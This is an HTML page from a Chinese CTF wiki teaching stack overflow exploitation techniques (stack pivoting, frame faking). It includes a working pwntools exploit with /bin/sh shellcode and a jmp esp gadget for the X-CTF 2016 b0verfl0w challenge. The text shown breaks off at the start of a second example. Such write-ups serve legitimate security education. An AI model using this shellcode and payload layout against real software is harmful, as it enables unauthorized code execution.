@@ -1,0 +1,1396 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe Wiki">
+      
+      
+      
+        <meta name="author" content="SkYe231">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>花式栈溢出技巧 - SkYe Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+        
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SkYe Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              花式栈溢出技巧
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" >
+    
+    <label class="md-nav__link" for="nav-1">
+      Pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" >
+    
+    <label class="md-nav__link" for="nav-1-1">
+      格式化字符串
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-1">
+        <span class="md-nav__icon md-icon"></span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
+      格式化字符串漏洞基础例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      格式化字符串漏洞基础利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#stack-pivoting" class="md-nav__link">
+    stack pivoting
+  </a>
+  
+    <nav class="md-nav" aria-label="stack pivoting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    使用条件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    示例
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#frame-faking" class="md-nav__link">
+    frame faking
+  </a>
+  
+    <nav class="md-nav" aria-label="frame faking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    控制过程
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    例题
+  </a>
+  
+    <nav class="md-nav" aria-label="例题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2018-over" class="md-nav__link">
+    2018 安恒杯 over
+  </a>
+  
+    <nav class="md-nav" aria-label="2018 安恒杯 over">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    分析
+  </a>
+  
+    <nav class="md-nav" aria-label="分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    文件信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    思路
+  </a>
+  
+    <nav class="md-nav" aria-label="思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leak-stack-addr" class="md-nav__link">
+    leak stack addr
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#leak-libc" class="md-nav__link">
+    leak libc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getshell" class="md-nav__link">
+    getshell
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stack-smash" class="md-nav__link">
+    Stack smash
+  </a>
+  
+    <nav class="md-nav" aria-label="Stack smash">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32c3-ctf-readme" class="md-nav__link">
+    32C3 CTF readme
+  </a>
+  
+    <nav class="md-nav" aria-label="32C3 CTF readme">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    确定 flag 地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#partial-overwrite" class="md-nav__link">
+    栈上的 partial overwrite
+  </a>
+  
+    <nav class="md-nav" aria-label="栈上的 partial overwrite">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2018-babypie" class="md-nav__link">
+    2018 - 安恒杯 - babypie
+  </a>
+  
+    <nav class="md-nav" aria-label="2018 - 安恒杯 - babypie">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    思路
+  </a>
+  
+    <nav class="md-nav" aria-label="思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leak-canary" class="md-nav__link">
+    leak canary
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#partial-overwrite_1" class="md-nav__link">
+    partial overwrite
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/stackoverflow/花式栈溢出技巧.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="_1">花式栈溢出技巧<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="stack-pivoting">stack pivoting<a class="headerlink" href="#stack-pivoting" title="Permanent link">&para;</a></h2>
+<h3 id="_2">原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。</p>
+<blockquote>
+<p>eip 的值是通过 esp 与  ret 指令压入。退出函数时，先执行 leave ，让 esp 指向 ebp ，然后 esp 加一个机器字长后，执行 ret 指令，将 esp 指向的值压入 eip 中。</p>
+</blockquote>
+<p>可能在以下情况需要使用 stack pivoting</p>
+<ul>
+<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
+<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
+<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
+</ul>
+<h3 id="_3">使用条件<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>利用 stack pivoting 有以下几个要求</p>
+<ul>
+<li>可以控制程序执行流。</li>
+<li>可以控制 sp 指针（栈顶指针）。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li>
+</ul>
+<div class="highlight"><pre><span></span><code>pop rsp/esp
+</code></pre></div>
+<p>当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。</p>
+<blockquote>
+<p>只有是用到了 libc ，编译时 gcc 会将 libc_csu_init  加到程序里。由这个函数也延伸了一种 ROP 技巧：ret2cus</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code>gef➤  x/7i 0x000000000040061a
+0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx
+0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp
+0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12
+0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13
+0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14
+0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
+0x400624 &lt;__libc_csu_init+100&gt;: ret    
+gef➤  x/7i 0x000000000040061d
+0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp
+0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13
+0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14
+0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
+0x400624 &lt;__libc_csu_init+100&gt;: ret
+</code></pre></div>
+<ul>
+<li>存在可以控制内容的内存，一般有如下</li>
+<li>bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。</li>
+<li>heap。但是这个需要我们能够泄露堆地址。</li>
+</ul>
+<h3 id="_4">示例<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w">X-CTF Quals 2016 - b0verfl0w</a> 为例进行介绍。源程序为 32 位，也没有开启 NX 保护，下面我们来找一下程序的漏洞：</p>
+<div class="highlight"><pre><span></span><code><span class="kt">signed</span> <span class="kt">int</span> <span class="n">vul</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-20h]@1</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">======================&quot;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Welcome to X-CTF 2016!&quot;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">======================&quot;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What&#39;s your name?&quot;</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello %s.&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>存在栈溢出漏洞。但是其所能溢出的字节就只有 50-0x20-4=14 个字节。</p>
+<p>程序本身并没有开启堆栈保护，所以我们可以在栈上布置 shellcode 并执行。基本利用思路如下</p>
+<ul>
+<li>利用栈溢出布置 shellcode</li>
+<li>控制 eip 指向 shellcode 处</li>
+</ul>
+<p>由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上**相对偏移是固定的**，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。</p>
+<div class="highlight"><pre><span></span><code>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ ROPgadget --binary b0verfl0w --only <span class="s1">&#39;jmp|ret&#39;</span>         
+Gadgets <span class="nv">information</span>
+<span class="o">============================================================</span>
+0x08048504 : jmp esp
+0x0804836a : ret
+0x0804847e : ret 0xeac1
+
+Unique gadgets found: <span class="m">3</span>
+</code></pre></div>
+<p>这里我们发现有一个可以直接跳转到 esp 的 gadgets。那么我们可以布置 payload 如下</p>
+<div class="highlight"><pre><span></span><code>shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
+</code></pre></div>
+<p>那么我们 payload 中的最后一部分改如何设置 esp 呢，可以知道</p>
+<ul>
+<li>size(shellcode+padding)=0x20</li>
+<li>size(fake ebp)=0x4</li>
+<li>size(0x08048504)=0x4</li>
+</ul>
+<p>所以我们最后一段需要执行的指令就是</p>
+<div class="highlight"><pre><span></span><code>sub esp,0x28
+jmp esp
+</code></pre></div>
+<p>所以最后的 exp 如下</p>
+<div class="highlight"><pre><span></span><code>from pwn import *
+sh = process(&#39;./b0verfl0w&#39;)
+
+shellcode_x86 = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+shellcode_x86 += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+shellcode_x86 += &quot;\x0b\xcd\x80&quot;
+
+sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)
+jmp_esp = 0x08048504
+payload = shellcode_x86 + (
+    0x20 - len(shellcode_x86)) * &#39;b&#39; + &#39;bbbb&#39; + p32(jmp_esp) + sub_esp_jmp
+sh.sendline(payload)
+sh.interactive()
+</code></pre></div>
+<p>这里补充一下具体程序过程：</p>
+<p>payload 结构如下：</p>
+<div class="highlight"><pre><span></span><code>shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
+</code></pre></div>
+<ol>
+<li>首先就是写入 shellcode 、填充、覆盖 ebp ；</li>
+<li>将 eip 覆盖为 <code>jmp esp</code>；eip 是下一条指令存储寄存器。当程序运行 <code>jmp esp</code> 之后，程序运行指针将从 text 段转移到栈上，将栈上的数据当做代码指令运行。这样操作之后，<code>set esp point to shellcode and jmp esp</code> 这一部分栈数据被当做是代码指令执行了。</li>
+<li><code>sub esp,0x28;jmp esp</code> ；将 esp 调整到 shellcode 的开始，当前 esp 和shellcode 的计算看前面；然后再一次 <code>jmp esp</code> ，将运行指针调整到 shellcode 。</li>
+</ol>
+<h2 id="frame-faking">frame faking<a class="headerlink" href="#frame-faking" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>也就是栈迁移</p>
+</blockquote>
+<h3 id="_5">原理<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>概括地讲，我们在之前讲的栈溢出不外乎两种方式</p>
+<ul>
+<li>控制程序 EIP</li>
+<li>控制程序 EBP</li>
+</ul>
+<p>其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下</p>
+<div class="highlight"><pre><span></span><code>buffer padding|fake ebp|leave ret addr|
+</code></pre></div>
+<p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分</p>
+<ul>
+<li>函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。</li>
+<li>其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li>
+</ul>
+<div class="highlight"><pre><span></span><code>fake ebp
+|
+v
+ebp2|target function addr|leave ret addr|arg1|arg2
+</code></pre></div>
+<p>这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p>
+<p>leave 指令相当于</p>
+<div class="highlight"><pre><span></span><code>mov esp, ebp # 将ebp的值赋给esp
+pop ebp # 弹出ebp
+</code></pre></div>
+<h3 id="_6">控制过程<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>仔细说一下基本的控制过程：</p>
+<ol>
+<li>在有栈溢出的程序执行 leave 时，其分为两个步骤</li>
+<li>mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。</li>
+<li>pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp 便指向了 ebp2，也就是保存了 ebp2 所在的地址。</li>
+<li>执行 ret 指令，会再次执行（溢出写入的） leave ret 指令。</li>
+<li>执行 leave 指令，其分为两个步骤</li>
+<li>mov esp, ebp ，这会将 esp 指向 ebp2。</li>
+<li>pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。</li>
+<li>执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行</li>
+<li>push ebp，会将 ebp2 值压入栈中，</li>
+<li>mov ebp, esp，将 ebp 指向当前基地址。</li>
+</ol>
+<p>此时的栈结构如下</p>
+<div class="highlight"><pre><span></span><code>ebp
+|
+v
+ebp2|leave ret addr|arg1|arg2
+</code></pre></div>
+<ol>
+<li>当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</li>
+<li>程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</li>
+</ol>
+<p>可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似（通过偏移获取栈上地址）。</p>
+<h3 id="_7">例题<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<h4 id="2018-over">2018 安恒杯 over<a class="headerlink" href="#2018-over" title="Permanent link">&para;</a></h4>
+<p>题目可以在 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/fake_frame/over">ctf-challenge</a> 中找到</p>
+<h5 id="_8">分析<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h5>
+<h6 id="_9">文件信息<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h6>
+<div class="highlight"><pre><span></span><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE
+</code></pre></div>
+<p>64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了 NX 保护</p>
+<h6 id="_10">漏洞函数<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h6>
